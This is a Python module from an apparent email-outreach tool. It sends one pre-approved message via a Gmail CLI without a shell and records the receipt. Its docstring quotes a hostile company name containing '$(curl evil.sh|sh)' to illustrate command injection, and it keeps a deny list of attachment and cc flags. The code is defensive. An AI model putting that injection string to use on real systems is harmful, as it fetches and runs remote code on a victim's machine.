#!/usr/bin/env python3
"""Send ONE approved outreach email and record its receipt, in one call.

This module exists to keep three prospect-derived strings off a command line.

The alternative is an agent composing
``google gmail send --to "..." -s "..." -b "..." --confirm`` as shell text. The
recipient, the subject and the body all come from a public directory page that
the prospect controls. A company that names itself ``Bricks $(curl evil.sh|sh)
Estates`` then executes that on Adam's machine, because a double-quoted bash
argument still evaluates ``$(...)`` and backticks. `prospects_db` already pins
the recipient to one plain address; the subject and the body have no such
grammar, and cannot have one -- they are prose.

So the command is never text. `send()` builds an argv LIST and runs it with no
shell, which makes every metacharacter inert data. It reads the recipient, the
subject and the body from the ledger rather than from its caller, so what
leaves is exactly the row Adam approved. And it advances the row to `sent`
inside the same call, so no window exists in which a delivered email is absent
from the ledger.

Usage:
    legoscout prospects outreach send <outreach_id>            # preview, sends nothing
    legoscout prospects outreach send <outreach_id> --confirm  # send and record

Adam's per-action approval belongs BEFORE `advance_outreach(..., "approved")`.
This module refuses any row that has not already passed that gate.
"""

from __future__ import annotations

import argparse
import json
import subprocess
import sys

from . import prospects as prospects_db

GMAIL_ARGV: tuple[str, ...] = ("google", "gmail", "send")

# Adam approves one recipient, one subject, one body. `--attach` would mail a
# local file, and `--cc`/`--bcc` would add a reader he never saw. No caller may
# add them, so they are named here as a standing prohibition rather than left
# to a reviewer to notice.
BANNED_FLAGS: tuple[str, ...] = ("--attach", "-a", "--cc", "--bcc")


class SendError(RuntimeError):
    """A send that must not proceed, or one that did not complete."""


def _resolve(outreach_id: int, path: str) -> tuple[dict, str]:
    """The outreach row plus the recipient address, or a raise naming the fix."""
    row = prospects_db.outreach_row(outreach_id, path=path)
    if row is None:
        raise SendError(
            "outreach_id %r is not in the ledger -- create the outreach with "
            "prospects_db.create_outreach first" % (outreach_id,))

    if row["state"] != "approved":
        raise SendError(
            "outreach %d is in state %r, and only an 'approved' outreach may "
            "send -- 'draft' has not passed Adam's approval gate, and any "
            "other state is already finished"
            % (outreach_id, row["state"]))

    contact = prospects_db.contact_row(row["contact_id"], path=path)
    if contact is None:
        raise SendError(
            "outreach %d points at contact_id %r, which is not in the ledger "
            "-- the address this message would go to is unknown"
            % (outreach_id, row["contact_id"]))
    email = contact["email"]
    if not email:
        raise SendError(
            "contact_id %d carries no email address, so this outreach has no "
            "email channel -- report the prospect to Adam as 'no email "
            "channel' instead of sending" % (row["contact_id"],))

    for field in ("subject", "body"):
        if not row[field] or not row[field].strip():
            raise SendError(
                "outreach %d has no %s, so there is nothing Adam could have "
                "approved -- recreate the draft with both"
                % (outreach_id, field))

    return row, email


def build_argv(email: str, subject: str, body: str) -> list[str]:
    """The exact argv. Each value is ONE element, which is what makes the
    shell irrelevant."""
    argv = [
        *GMAIL_ARGV,
        "--to", email,
        "-s", subject,
        "-b", body,
        "--confirm",
    ]
    for banned in BANNED_FLAGS:
        if banned in argv:
            raise SendError(
                "refusing to send: %r reached the argv, and Adam approved one "
                "recipient, one subject and one body" % (banned,))
    return argv


def _message_id(stdout: str | None) -> str:
    """The Gmail message id the CLI reported, or a raise.

    `google gmail send` writes its human line to stderr and pure JSON to
    stdout. On a real send that JSON carries `id`. A preview carries `status:
    preview (not sent)` and no id. Anything else means the send did not
    complete in the way this contract expects, and inventing an id here would
    record a delivery that may not have happened.
    """
    if not stdout or not stdout.strip():
        raise SendError(
            "the send exited 0 but printed nothing on stdout, so no message "
            "id is available -- treat the send as unconfirmed and check "
            "Adam's Sent folder before retrying")
    try:
        payload = json.loads(stdout)
    except json.JSONDecodeError as exc:
        raise SendError(
            "the send exited 0 but its stdout is not JSON, so no message id "
            "is available (%s) -- stdout was %r" % (exc, stdout[:400])) from exc
    if not isinstance(payload, dict) or "id" not in payload:
        raise SendError(
            "the send exited 0 but its JSON carries no 'id', so the message "
            "id is unknown -- stdout was %r" % (stdout[:400],))
    value = payload["id"]
    if not isinstance(value, str) or not value.strip():
        raise SendError(
            "the send reported an 'id' that is not a non-empty string (%r), "
            "so the message id is unusable" % (value,))
    return value


def send(outreach_id: int, path: str = prospects_db.DB_PATH,
         runner=subprocess.run) -> str:
    """Send one approved outreach, record the receipt, return the message id.

    `runner` is the seam the contract test drives. It is `subprocess.run` in
    every real call, and it is called with an argv LIST and no shell.
    """
    row, email = _resolve(outreach_id, path)
    argv = build_argv(email, row["subject"], row["body"])

    result = runner(argv, capture_output=True, text=True)

    if result.returncode != 0:
        raise SendError(
            "google gmail send exited %d, so no email left and outreach %d "
            "stays 'approved' -- stderr was %r"
            % (result.returncode, outreach_id, (result.stderr or "")[:600]))

    message_id = _message_id(result.stdout)
    try:
        prospects_db.advance_outreach(
            outreach_id, "sent", sent_message_id=message_id, path=path)
    except Exception as exc:  # noqa: BLE001 -- the email already left
        # Past this point the email is DELIVERED. Anything that stops the
        # ledger from recording it must say so in the first line, because the
        # obvious next move -- retry -- would mail the prospect twice.
        raise SendError(
            "THE EMAIL WAS SENT (Gmail message id %s) but outreach %d could "
            "NOT be advanced to 'sent': %s: %s. Do NOT retry the send. Record "
            "the state by hand, or ask Adam to check his Sent folder first."
            % (message_id, outreach_id, type(exc).__name__, exc)) from exc
    return message_id


def preview(outreach_id: int, path: str = prospects_db.DB_PATH) -> dict:
    """What a send WOULD do. It runs no command and writes nothing."""
    row, email = _resolve(outreach_id, path)
    return {
        "outreach_id": outreach_id,
        "to": email,
        "subject": row["subject"],
        "body": row["body"],
        "state": row["state"],
        "status": "preview (nothing sent, nothing written)",
    }


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Send one approved LEGO Scout outreach email and record "
                    "its Gmail message id in the ledger, in one call. Without "
                    "--confirm it previews and sends nothing.")
    parser.add_argument("outreach_id", type=int,
                        help="the outreach row to send; it must be in state "
                             "'approved'")
    parser.add_argument("--confirm", action="store_true",
                        help="actually send. Adam must have approved this "
                             "exact body first")
    parser.add_argument("--db", default=prospects_db.DB_PATH,
                        help="ledger path (default: %(default)s)")
    args = parser.parse_args()

    try:
        if not args.confirm:
            print(json.dumps(preview(args.outreach_id, path=args.db), indent=2))
            print("To send, rerun with --confirm.", file=sys.stderr)
            return 0
        message_id = send(args.outreach_id, path=args.db)
    except SendError as exc:
        print(f"send_outreach: {exc}", file=sys.stderr)
        return 1
    print(json.dumps({"outreach_id": args.outreach_id, "state": "sent",
                      "sent_message_id": message_id}, indent=2))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
